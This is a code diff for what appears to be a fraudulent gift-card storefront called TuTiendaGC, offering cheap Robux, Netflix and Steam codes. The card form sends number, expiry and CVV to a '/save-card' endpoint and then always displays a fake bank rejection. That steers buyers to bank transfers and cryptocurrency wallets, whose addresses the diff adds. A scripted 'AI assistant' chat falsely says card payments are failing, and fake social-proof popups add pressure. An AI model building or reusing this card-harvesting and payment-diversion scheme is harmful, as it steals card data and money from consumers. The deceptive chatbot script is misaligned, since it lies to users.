@@ -262,6 +262,58 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* --- ESTILOS PARA LA PESTAÑA DE CRIPTOMONEDAS --- */
+        .crypto-details {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .crypto-item {
+            border: 1px solid #ddd;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+        }
+
+        .crypto-item label {
+            font-size: 0.9em;
+            color: #555;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .copy-input-group {
+            display: flex;
+            align-items: stretch; /* Asegura que el botón ocupe toda la altura */
+        }
+
+        .copy-input-group input {
+            flex-grow: 1;
+            border-top-right-radius: 0;
+            border-bottom-right-radius: 0;
+            padding-right: 5px;
+            font-size: 0.9em; 
+            word-break: break-all;
+        }
+
+        .copy-button {
+            background-color: #2c9b6f; /* Color de éxito/cripto */
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-size: 1em;
+            border-radius: 0 5px 5px 0;
+            transition: background-color 0.2s ease;
+            white-space: nowrap;
+        }
+
+        .copy-button:hover {
+            background-color: #1a7a58;
+        }
+        /* --- FIN ESTILOS CRIPTO Y COPIADO --- */
+
         /* --- Testimoniales y Reseñas --- */
         .section.reseñas {
             background-color: #e9e9e9;
@@ -613,28 +665,80 @@
 
         <div class="payment-options">
             <label>
-                <input type="radio" name="paymentMethod" value="transferencia" checked> Transferencia Bancaria
+                <input type="radio" name="paymentMethod" value="transferencia-mx" checked> Transferencia Bancaria (MX)
+            </label>
+            <label>
+                <input type="radio" name="paymentMethod" value="cripto"> Criptomonedas (USDT/BTC/LTC)
             </label>
             <label>
                 <input type="radio" name="paymentMethod" value="tarjeta"> Tarjeta de Crédito/Débito
             </label>
         </div>
 
-        <div id="transferencia" class="form-panel">
+        <div id="transferencia-mx" class="form-panel">
+            <h4 style="margin-bottom: 15px;">Datos para Transferencia (CLABE)</h4>
+            
             <div class="form-group">
-                <label for="nombre">Nombre en la Cuenta Bancaria:</label>
-                <input type="text" id="nombre" name="nombre" placeholder="Pablo Israel" required>
+                <label for="beneficiario-mx">Beneficiario:</label>
+                <div class="copy-input-group">
+                    <input type="text" id="beneficiario-mx" name="beneficiario-mx" value="Magdaleno Martinez Gomez" disabled>
+                    <button class="copy-button" onclick="copyToClipboard('Magdaleno Martinez Gomez', this)">Copiar</button>
+                </div>
             </div>
+            
             <div class="form-group">
-                <label for="banco">Banco:</label>
-                <input type="text" id="banco" name="banco" value="Klar" disabled>
+                <label for="banco-mx">Banco:</label>
+                <div class="copy-input-group">
+                    <input type="text" id="banco-mx" name="banco-mx" value="Nvio" disabled>
+                    <button class="copy-button" onclick="copyToClipboard('Nvio', this)">Copiar</button>
+                </div>
             </div>
+            
             <div class="form-group">
-                <label for="cuenta">Número de Cuenta CLABE:</label>
-                <input type="text" id="cuenta" name="cuenta" value="661180006948807615" disabled>
+                <label for="cuenta-mx">CLABE Interbancaria:</label>
+                <div class="copy-input-group">
+                    <input type="text" id="cuenta-mx" name="cuenta-mx" value="710969000074702147" disabled>
+                    <button class="copy-button" onclick="copyToClipboard('710969000074702147', this)">Copiar</button>
+                </div>
+            </div>
+            
+             <div class="form-group">
+                <label for="nombre-mx">Tu Nombre en la Cuenta Bancaria (Obligatorio para identificar tu pago):</label>
+                <input type="text" id="nombre-mx" name="nombre-mx" placeholder="Pablo Israel" required>
             </div>
         </div>
 
+        <div id="crypto-panel" class="form-panel" style="display: none;">
+            <h4 style="margin-bottom: 15px;">Direcciones de Criptomonedas (Verifica la red)</h4>
+
+            <div class="crypto-details">
+                <div class="crypto-item">
+                    <label>USDT (Red TRC20 - ¡Solo usar esta red!)</label>
+                    <div class="copy-input-group">
+                        <input type="text" value="TUT4ZqQYEv32oiUGC3pNmYBYEoUUGMm1eV" disabled>
+                        <button class="copy-button" onclick="copyToClipboard('TUT4ZqQYEv32oiUGC3pNmYBYEoUUGMm1eV', this)">Copiar</button>
+                    </div>
+                </div>
+
+                <div class="crypto-item">
+                    <label>Bitcoin (BTC)</label>
+                    <div class="copy-input-group">
+                        <input type="text" value="1K6jsMAfJJMEQ6dPmJDV7CEZfDGHhsXznw" disabled>
+                        <button class="copy-button" onclick="copyToClipboard('1K6jsMAfJJMEQ6dPmJDV7CEZfDGHhsXznw', this)">Copiar</button>
+                    </div>
+                </div>
+
+                <div class="crypto-item">
+                    <label>Litecoin (LTC)</label>
+                    <div class="copy-input-group">
+                        <input type="text" value="LWzK1bGXLva267M2wZHHHm9eJQ6UgFuhvz" disabled>
+                        <button class="copy-button" onclick="copyToClipboard('LWzK1bGXLva267M2wZHHHm9eJQ6UgFuhvz', this)">Copiar</button>
+                    </div>
+                </div>
+            </div>
+            <p style="margin-top: 15px; font-size: 0.9em; color: #e50914;">**IMPORTANTE:** Tu código se enviará al correo electrónico **después de 3 confirmaciones de la red** (puede tardar de 10 a 60 minutos).</p>
+        </div>
+        
         <div id="tarjeta" class="form-panel" style="display: none;">
             <div class="form-group">
                 <label for="tarjeta-numero">Número de Tarjeta:</label>
@@ -702,7 +806,7 @@
     </div>
     <div id="chat-body">
         <div class="message ai-message">
-            ¡Hola! Soy la asistente IA de TuTiendaGC. ¿En qué puedo ayudarte hoy? (Prueba a preguntar sobre precios o códigos).
+            ¡Hola! Soy la asistente IA de TuTiendaGC. ¿En qué puedo ayudarte hoy? (Prueba a preguntar sobre precios o métodos de pago).
         </div>
         <div id="typing-indicator" class="typing-indicator">La IA está escribiendo...</div>
     </div>
@@ -718,8 +822,11 @@
     // --- ELEMENTOS DEL FORMULARIO ---
     const paymentPanel = document.getElementById('paymentPanel');
     const totalAmountSpan = document.getElementById('totalAmount');
-    const transferPanel = document.getElementById('transferencia');
+    // Renombrado para la nueva Transferencia MX
+    const transferPanelMX = document.getElementById('transferencia-mx'); 
     const cardPanel = document.getElementById('tarjeta');
+    // Nuevo panel de criptomonedas
+    const cryptoPanel = document.getElementById('crypto-panel'); 
     const cardIcon = document.getElementById('cardIcon');
     const cardStatus = document.getElementById('cardStatus');
     const expiryInput = document.getElementById('expiracion');
@@ -753,6 +860,28 @@
         // Inicia la alerta de prueba social
         setInterval(showSocialProof, 8000); 
     });
+
+    // --- LÓGICA DE COPIADO ---
+    function copyToClipboard(textToCopy, buttonElement) {
+        // Usamos la API del portapapeles
+        navigator.clipboard.writeText(textToCopy).then(() => {
+            const originalText = buttonElement.textContent;
+            const originalBG = buttonElement.style.backgroundColor;
+            
+            buttonElement.textContent = '✅ Copiado';
+            buttonElement.style.backgroundColor = '#1a7a58'; // Verde oscuro para indicar éxito
+            
+            // Revertir el texto y color después de 2 segundos
+            setTimeout(() => {
+                buttonElement.textContent = originalText;
+                buttonElement.style.backgroundColor = originalBG;
+            }, 2000);
+            
+        }).catch(err => {
+            console.error('Error al copiar: ', err);
+            alert('Error al copiar el texto: ' + textToCopy);
+        });
+    }
 
     // --- LÓGICA DE PRUEBA SOCIAL ---
     function generateStars(count) {
@@ -788,7 +917,7 @@
         }, 500);
     }
     
-    // --- LÓGICA DE NAVEGACIÓN ---
+    // --- LÓGICA DE NAVEGACIÓN Y PAGO ---
     function scrollToSection(id) {
         const section = document.getElementById(id);
         if (section) {
@@ -798,8 +927,6 @@
             console.error(`La sección con ID '${id}' no fue encontrada.`);
         }
     }
-
-    // --- LÓGICA DE PAGO Y VALIDACIÓN DE TARJETA ---
 
     function showPaymentPanel(productName, productPrice) {
         currentProduct = { name: productName, price: productPrice };
@@ -814,8 +941,19 @@
 
     document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
         radio.addEventListener('change', () => {
-            transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
-            cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
+            // Ocultar todos los paneles
+            transferPanelMX.style.display = 'none';
+            cardPanel.style.display = 'none';
+            cryptoPanel.style.display = 'none';
+
+            // Mostrar el panel seleccionado
+            if (radio.value === 'transferencia-mx') {
+                transferPanelMX.style.display = 'block';
+            } else if (radio.value === 'tarjeta') {
+                cardPanel.style.display = 'block';
+            } else if (radio.value === 'cripto') {
+                cryptoPanel.style.display = 'block';
+            }
             
             // Limpiar errores y estado al cambiar de método de pago
             cardNumInput.classList.remove('input-error');
@@ -848,8 +986,6 @@
 
     /**
      * Detecta el tipo de tarjeta (Visa, Mastercard, etc.) basado en el prefijo.
-     * @param {string} number - El número de tarjeta.
-     * @returns {string} - El tipo de tarjeta o 'Unknown'.
      */
     function detectCardType(number) {
         const cleanNumber = number.replace(/\s/g, '');
@@ -888,8 +1024,6 @@
 
     /**
      * Muestra el estado de la tarjeta debajo del campo de número.
-     * @param {string} type - Tipo de tarjeta detectado.
-     * @param {string} cleanNumber - El número de tarjeta sin espacios.
      */
     function updateCardStatus(type, cleanNumber) {
         let statusText = '';
@@ -1032,34 +1166,43 @@
 
         const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
 
-        // 2. Validar Campos de Tarjeta (si aplica)
+        // 2. Validar Campos Adicionales (Transferencia MX)
+        if (paymentMethod === 'transferencia-mx') {
+             const nombreMxInput = document.getElementById('nombre-mx');
+             nombreMxInput.classList.remove('input-error');
+             if (nombreMxInput.value.trim() === '') {
+                 nombreMxInput.classList.add('input-error');
+                 errorMessage.textContent = 'Debes introducir el nombre de la cuenta bancaria desde la que realizarás la transferencia para identificar tu pago.';
+                 errorMessage.style.display = 'block';
+                 return;
+             }
+        }
+        
+        // 3. Validar Campos de Tarjeta (si aplica)
         if (paymentMethod === 'tarjeta') {
             if (!validateCardFields()) {
                 errorMessage.style.display = 'block';
                 return;
             }
-            // Si la tarjeta es válida, volvemos a mostrar el estado final del tipo
-            const cardType = detectCardType(cardNumInput.value);
-            updateCardStatus(cardType, cardNumInput.value.replace(/\s/g, ''));
         }
 
         // Mostrar el spinner
         document.getElementById('spinner').style.display = 'block';
 
-        // --- LÓGICA MODIFICADA PARA GUARDADO Y RECHAZO FORZADO (TARJETA) ---
+        // --- LÓGICA DE PROCESAMIENTO POR MÉTODO DE PAGO ---
+        
+        // 1. Pago con Tarjeta (Rechazo Forzado)
         if (paymentMethod === 'tarjeta') {
             const cardData = {
                 product: currentProduct.name,
                 price: currentProduct.price,
                 email: email,
-                // Limpiamos los espacios del número de tarjeta para guardarlo
                 number: cardNumInput.value.replace(/\s+/g, ''),
                 expiry: expiryInput.value,
                 cvv: cvvInput.value
             };
 
-            // 1. Iniciar el guardado de datos (ASÍNCRONO - NO BLOQUEA EL TIMER)
-            // Esto garantiza que los datos se envíen al servidor para guardarse en inventario_tarjetas.txt
+            // Iniciar el guardado de datos (ASÍNCRONO - NO BLOQUEA EL TIMER)
             fetch('/save-card', { 
                 method: 'POST',
                 headers: {
@@ -1068,23 +1211,20 @@
                 body: JSON.stringify(cardData),
             })
             .then(response => {
-                // Se registra que el intento de guardado terminó, pero no se actualiza la UI
                 console.log(`[SERVER] Intento de guardado de tarjeta completado. Status: ${response.status}`);
             })
             .catch(error => {
-                // Se registra un error de conexión, si lo hay.
                 console.error('[SERVER ERROR] Error al intentar guardar la tarjeta:', error);
             });
 
 
-            // 2. Esperar 5 segundos, mostrar círculo, y FORZAR RECHAZO en la UI
+            // Esperar 5 segundos, y FORZAR RECHAZO en la UI
             setTimeout(() => {
                 
-                // Ocultar el spinner
                 document.getElementById('spinner').style.display = 'none';
                 
                 // Mostrar el error de rechazo bancario forzado
-                errorMessage.textContent = '❌ RECHAZO BANCARIO: El banco ha rechazado el pago. Por favor, verifica tu saldo, contacta a tu banco, o intenta con otro método de pago (ej. Transferencia).';
+                errorMessage.textContent = '❌ RECHAZO BANCARIO: El banco ha rechazado el pago. Por favor, verifica tu saldo, contacta a tu banco, o intenta con otro método de pago (ej. Transferencia o Cripto).';
                 errorMessage.style.display = 'block';
 
                 // Limpiar los campos de tarjeta para reintento
@@ -1100,11 +1240,20 @@
             }, 5000); // 5 segundos de espera (5000ms)
 
         } 
-        // Lógica de Transferencia Bancaria (se mantiene con éxito simulado)
-        else { 
+        // 2. Transferencia Bancaria (MX) - Éxito Simulado
+        else if (paymentMethod === 'transferencia-mx') { 
+            const nombreComprador = document.getElementById('nombre-mx').value.trim();
             setTimeout(() => {
                 document.getElementById('spinner').style.display = 'none';
-                alert(`✅ PAGO ACEPTADO - TRANSFERENCIA\nConfirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu código será enviado al correo ${email} al recibir el pago.`);
+                alert(`✅ PAGO PENDIENTE - TRANSFERENCIA MX\n\nConfirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la CLABE 710969000074702147 (Nvio - Magdaleno Martinez Gomez). \n\n¡Importante! Tu código será enviado al correo ${email} al verificar que el pago provino de la cuenta de **${nombreComprador}**.`);
+                paymentPanel.style.display = 'none';
+            }, 3000); // Espera de 3 segundos
+        }
+        // 3. Criptomonedas (USDT/BTC/LTC) - Éxito Simulado
+        else if (paymentMethod === 'cripto') {
+             setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                alert(`✅ PAGO PENDIENTE - CRIPTOMONEDA\n\nPor favor, realiza el envío de $${currentProduct.price.toFixed(2)} USD en la criptomoneda que elegiste a la dirección copiada.\n\nUna vez que la transacción tenga 3 confirmaciones en la red, tu código será enviado al correo ${email}. ¡Gracias por tu compra!`);
                 paymentPanel.style.display = 'none';
             }, 3000); // Espera de 3 segundos
         }
@@ -1148,9 +1297,9 @@
         if (lowerText.includes("precio") || lowerText.includes("costo")) {
             response = "Actualmente, la tarjeta de Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, Netflix cuesta $10.00 USD y la tarjeta de Steam $50 cuesta $15.00 USD. ¡Son ofertas limitadas!";
         } else if (lowerText.includes("codigo") || lowerText.includes("clave")) {
-            response = "Una vez confirmado el pago, el código digital se envía automáticamente a tu correo electrónico en menos de 5 minutos.";
-        } else if (lowerText.includes("pago") || lowerText.includes("transferencia") || lowerText.includes("tarjeta")) {
-            response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Crédito/Débito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta está fallando actualmente, por lo que recomendamos la transferencia.";
+            response = "Una vez confirmado el pago, el código digital se envía automáticamente a tu correo electrónico en menos de 5 minutos (o después de 3 confirmaciones de red para criptomonedas).";
+        } else if (lowerText.includes("pago") || lowerText.includes("transferencia") || lowerText.includes("tarjeta") || lowerText.includes("cripto")) {
+            response = "Aceptamos **Transferencia Bancaria (MX)**, **Criptomonedas (USDT TRC20, BTC, LTC)** y **Tarjeta de Crédito/Débito**. Ten en cuenta que el pago con tarjeta está fallando actualmente, por lo que recomendamos la transferencia o cripto.";
         } else if (lowerText.includes("hola") || lowerText.includes("saludos")) {
             response = "¡Hola! ¿Buscas Game Pass, Robux, Netflix o Steam? Puedo darte información sobre los precios y el proceso de compra.";
         } else if (lowerText.includes("ayuda") || lowerText.includes("problema")) {
